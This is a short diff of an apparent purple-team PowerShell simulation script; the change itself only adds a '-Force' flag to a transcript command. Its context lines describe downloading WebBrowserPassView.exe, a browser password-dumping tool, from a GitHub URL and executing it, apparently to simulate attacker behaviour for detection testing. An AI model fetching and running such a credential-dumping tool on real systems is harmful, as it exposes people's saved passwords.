@@ -5,7 +5,7 @@
     Download  WebBrowserPassView.exe from forked project https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/WebBrowserPassView.exe and execute it 
 #>
 
-Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append
+Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force
 
 # Download and execute WebBrowserPassView.exe (the binary on my repo is accepting commandline, the default available on Nirsoft site does not)
 $url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/WebBrowserPassView.exe"
